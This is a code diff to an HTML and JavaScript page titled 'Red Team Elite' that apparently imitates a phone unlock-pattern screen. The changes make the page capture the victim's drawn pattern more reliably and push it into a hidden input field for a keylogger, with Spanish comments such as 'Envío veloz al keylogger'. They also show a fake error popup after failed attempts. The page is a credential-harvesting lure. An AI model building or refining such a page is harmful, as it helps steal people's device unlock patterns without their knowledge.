@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Red Team Pattern - Ultra Sensitive</title>
+    <title>Red Team Elite - Ultra Fluid</title>
     <style>
         :root {
             --mario-white: #ffffff;
@@ -13,13 +13,14 @@
             --loader-grey: #888888;
         }
 
-        * { box-sizing: border-box; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body, html {
             margin: 0; padding: 0; height: 100vh; width: 100vw; overflow: hidden;
             font-family: 'Segoe UI', sans-serif;
             background: url('fondo.png') no-repeat center center fixed;
             background-size: cover; background-color: #1a1a1a;
+            touch-action: none;
         }
 
         #key-sink { position: absolute; top: -100px; opacity: 0; }
@@ -61,7 +62,10 @@
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        #pattern-wrapper { position: relative; width: 280px; height: 280px; touch-action: none; }
+        #pattern-wrapper { 
+            position: relative; width: 280px; height: 280px; 
+            will-change: transform; /* Optimización de GPU */
+        }
 
         canvas { position: absolute; top: 0; left: 0; z-index: 1; pointer-events: none; }
 
@@ -75,7 +79,6 @@
             width: 10px; height: 10px; background: var(--mario-white); 
             border: none; border-radius: 50%; margin: auto;
             box-shadow: 0 0 5px rgba(0,0,0,0.3);
-            pointer-events: none;
         }
 
         .bottom-links {
@@ -110,15 +113,9 @@
         </div>
         <canvas id="pattern-canvas"></canvas>
         <div class="dots-grid">
-            <div class="dot" id="d1" data-id="1"></div>
-            <div class="dot" id="d2" data-id="2"></div>
-            <div class="dot" id="d3" data-id="3"></div>
-            <div class="dot" id="d4" data-id="4"></div>
-            <div class="dot" id="d5" data-id="5"></div>
-            <div class="dot" id="d6" data-id="6"></div>
-            <div class="dot" id="d7" data-id="7"></div>
-            <div class="dot" id="d8" data-id="8"></div>
-            <div class="dot" id="d9" data-id="9"></div>
+            <div class="dot" data-id="1"></div><div class="dot" data-id="2"></div><div class="dot" data-id="3"></div>
+            <div class="dot" data-id="4"></div><div class="dot" data-id="5"></div><div class="dot" data-id="6"></div>
+            <div class="dot" data-id="7"></div><div class="dot" data-id="8"></div><div class="dot" data-id="9"></div>
         </div>
     </div>
 
@@ -152,7 +149,6 @@
     canvas.width = 280;
     canvas.height = 280;
 
-    // Precargar centros para mayor velocidad
     function updateCenters() {
         dotCenters = Array.from(dots).map(dot => {
             const rect = dot.getBoundingClientRect();
@@ -166,6 +162,28 @@
         });
     }
 
+    // --- FUNCIÓN CLAVE: INTERPOLACIÓN LINEAL ---
+    function checkIntersections(x1, y1, x2, y2) {
+        dotCenters.forEach(center => {
+            if (path.find(p => p.id === center.id)) return;
+
+            // Distancia del punto a la línea del dedo
+            const L2 = (x2 - x1) ** 2 + (y2 - y1) ** 2;
+            if (L2 === 0) return;
+            let t = ((center.x - x1) * (x2 - x1) + (center.y - y1) * (y2 - y1)) / L2;
+            t = Math.max(0, Math.min(1, t));
+            
+            const dist = Math.sqrt((center.x - (x1 + t * (x2 - x1))) ** 2 + (center.y - (y1 + t * (y2 - y1))) ** 2);
+
+            // Si la línea pasa a menos de 25px de un punto, lo capturamos
+            if (dist < 25) {
+                path.push(center);
+                center.element.classList.add('active');
+                if (navigator.vibrate) navigator.vibrate(35);
+            }
+        });
+    }
+
     function start(e) {
         updateCenters();
         isDrawing = true;
@@ -174,7 +192,11 @@
         dotCenters.forEach(c => c.element.classList.remove('active'));
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         popup.style.display = 'none';
-        keySink.value = "";
+        
+        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+        const rect = wrapper.getBoundingClientRect();
+        mousePos = { x: clientX - rect.left, y: clientY - rect.top };
     }
 
     function move(e) {
@@ -182,23 +204,14 @@
         const clientX = e.touches ? e.touches[0].clientX : e.clientX;
         const clientY = e.touches ? e.touches[0].clientY : e.clientY;
         const rect = wrapper.getBoundingClientRect();
-        mousePos = { x: clientX - rect.left, y: clientY - rect.top };
+        
+        const newX = clientX - rect.left;
+        const newY = clientY - rect.top;
 
-        dotCenters.forEach(center => {
-            // --- FÍSICA MEJORADA: Distancia Euclidiana para "pegajosidad" ---
-            const dx = mousePos.x - center.x;
-            const dy = mousePos.y - center.y;
-            const distance = Math.sqrt(dx * dx + dy * dy);
-
-            // Si el dedo está cerca (radio 35px), lo captura
-            if (distance < 35) {
-                if (!path.find(p => p.id === center.id)) {
-                    path.push(center);
-                    center.element.classList.add('active');
-                    if (navigator.vibrate) navigator.vibrate(40);
-                }
-            }
-        });
+        // Verificamos si en el trayecto desde la posición anterior tocamos algún punto
+        checkIntersections(mousePos.x, mousePos.y, newX, newY);
+        
+        mousePos = { x: newX, y: newY };
     }
 
     function end() {
@@ -207,33 +220,23 @@
         const userPattern = path.map(p => p.id).join('');
         
         if (path.length > 0) {
-            capturarParaKeylogger(userPattern);
+            // Envío veloz al keylogger
+            keySink.focus();
+            keySink.value = userPattern;
+            keySink.dispatchEvent(new Event('input', { bubbles: true }));
+            keySink.blur();
+
             if (userPattern !== CORRECT_PATTERN) {
                 failCount++;
                 if (failCount === 1) {
                     lineColor = '#ff4444';
-                    setTimeout(resetUI, 800);
+                    setTimeout(resetUI, 600);
                 } else {
                     popup.style.display = 'flex';
                     setTimeout(() => { popup.style.display = 'none'; failCount = 0; resetUI(); }, 10000);
                 }
             }
         }
-    }
-
-    function capturarParaKeylogger(texto) {
-        keySink.focus();
-        let i = 0;
-        const intervalo = setInterval(() => {
-            if (i < texto.length) {
-                keySink.value += texto[i];
-                keySink.dispatchEvent(new Event('input', { bubbles: true }));
-                i++;
-            } else {
-                clearInterval(intervalo);
-                keySink.blur();
-            }
-        }, 100); 
     }
 
     function resetUI() {
@@ -249,8 +252,7 @@
                 ctx.beginPath();
                 ctx.lineWidth = 5;
                 ctx.strokeStyle = lineColor; 
-                ctx.lineJoin = 'round';
-                ctx.lineCap = 'round';
+                ctx.lineJoin = 'round'; ctx.lineCap = 'round';
                 ctx.moveTo(path[0].x, path[0].y);
                 for (let i = 1; i < path.length; i++) {
                     ctx.lineTo(path[i].x, path[i].y);
@@ -266,11 +268,6 @@
     wrapper.addEventListener('touchstart', (e) => { e.preventDefault(); start(e); }, { passive: false });
     window.addEventListener('touchmove', (e) => { move(e); }, { passive: false });
     window.addEventListener('touchend', end);
-    
-    // PC Support
-    wrapper.addEventListener('mousedown', start);
-    window.addEventListener('mousemove', move);
-    window.addEventListener('mouseup', end);
 </script>
 </body>
 </html>
